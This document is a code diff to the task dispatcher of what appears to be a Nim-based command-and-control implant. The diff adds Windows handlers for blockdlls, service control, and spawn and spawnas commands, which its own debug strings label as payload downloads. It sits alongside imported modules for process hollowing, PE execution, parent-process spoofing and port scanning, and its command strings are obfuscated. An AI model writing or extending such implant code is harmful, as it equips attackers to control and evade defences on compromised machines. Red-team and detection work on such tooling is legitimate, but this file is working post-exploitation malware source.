@@ -1,18 +1,11 @@
-## Task processing utilities for reuse in profiles
-## This module provides functions to execute tasks and build responses
-## This is the single source of truth for task execution logic
-
-import std/[json, strutils]
+import std/[json]
 import ../config
-import ../global_data
 import ../utils/debug
 import ../utils/strenc
-import ../utils/m_responses
 import ../utils/sysinfo
 
 # Import all task modules
 import ../tasks/exit
-import ../tasks/sleep
 import ../tasks/ls
 import ../tasks/download
 import ../tasks/upload
@@ -33,16 +26,14 @@ import ../tasks/redirect
 import ../tasks/getenv as taskGetenv
 import ../tasks/connect
 import ../tasks/disconnect
-
-when defined(windows):
-  import ../tasks/link
-  import ../tasks/unlink
-
 import ../tasks/portscan
 import ../tasks/ifconfig
 import ../tasks/netstat
 import ../tasks/config as taskConfig
 import ../tasks/pkill
+
+when not defined(windows):
+  import ../utils/m_responses
 
 when defined(windows):
   import ../tasks/execute_assembly
@@ -63,6 +54,7 @@ when defined(windows):
   import ../tasks/spawnto_x64
   import ../tasks/spawnto_x86
   import ../tasks/ppid
+  import ../tasks/blockdlls
   import ../tasks/reg_query
   import ../tasks/reg_write_value
   import ../tasks/net_dclist
@@ -77,6 +69,11 @@ when defined(windows):
   import ../tasks/inject_hollow
   import ../tasks/run_pe
   import ../tasks/register_file
+  import ../tasks/sc
+  import ../tasks/spawn
+  import ../tasks/spawnas
+  import ../tasks/link
+  import ../tasks/unlink
 
 import ../tasks/deregister_file
 
@@ -542,6 +539,18 @@ proc executeTask*(taskId: string, command: string, params: JsonNode): TaskExecut
           obf("user_output"): obf("ppid command is only available on Windows")
         }
     
+    of obf("blockdlls"):
+      when defined(windows):
+        debug "[DEBUG] Executing blockdlls command"
+        result.response = blockdlls(taskId, params)
+      else:
+        result.response = %*{
+          obf("task_id"): taskId,
+          obf("completed"): true,
+          obf("status"): "error",
+          obf("user_output"): obf("blockdlls command is only available on Windows")
+        }
+    
     of obf("reg_query"):
       when defined(windows):
         debug "[DEBUG] Executing reg_query command"
@@ -696,6 +705,45 @@ proc executeTask*(taskId: string, command: string, params: JsonNode): TaskExecut
       debug "[DEBUG] Executing deregister_file command"
       result.response = deregisterFile(taskId, params)
       result.response[obf("task_id")] = %taskId
+    
+    of obf("sc"):
+      when defined(windows):
+        debug "[DEBUG] Executing sc command"
+        result.response = sc(taskId, params)
+        result.response[obf("task_id")] = %taskId
+      else:
+        result.response = %*{
+          obf("task_id"): taskId,
+          obf("completed"): true,
+          obf("status"): "error",
+          obf("user_output"): obf("sc command is only available on Windows")
+        }
+    
+    of obf("spawn"):
+      when defined(windows):
+        debug "[DEBUG] Starting spawn (payload download)"
+        result.response = spawn(taskId, params)
+        result.needsBackgroundTracking = true
+      else:
+        result.response = %*{
+          obf("task_id"): taskId,
+          obf("completed"): true,
+          obf("status"): "error",
+          obf("user_output"): obf("spawn command is only available on Windows")
+        }
+    
+    of obf("spawnas"):
+      when defined(windows):
+        debug "[DEBUG] Starting spawnas (payload download)"
+        result.response = spawnas(taskId, params)
+        result.needsBackgroundTracking = true
+      else:
+        result.response = %*{
+          obf("task_id"): taskId,
+          obf("completed"): true,
+          obf("status"): "error",
+          obf("user_output"): obf("spawnas command is only available on Windows")
+        }
     
     else:
       # Command not implemented
